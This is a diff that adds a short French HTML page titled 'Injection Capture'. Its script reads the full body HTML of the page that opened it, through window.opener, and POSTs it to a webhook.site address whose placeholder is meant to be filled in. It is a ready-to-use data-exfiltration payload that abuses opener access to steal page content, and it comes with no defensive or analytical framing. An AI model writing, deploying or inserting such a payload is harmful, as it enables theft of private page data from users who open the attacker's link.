@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Injection Capture</title>
+</head>
+
+<body>
+    <h1>Injection en cours...</h1>
+    <script>
+        if (window.opener) {
+            let bodyContent = window.opener.document.body.innerHTML;
+
+            // Envoyer les données vers un serveur
+            fetch("https://webhook.site/TON_WEBHOOK", { // Remplace par ton URL webhook
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: bodyContent })
+            }).then(() => {
+                console.log("Body envoyé !");
+            }).catch(err => console.error("Erreur:", err));
+        } else {
+            console.log("Pas d'opener disponible");
+        }
+    </script>
+</body>
+
+</html>
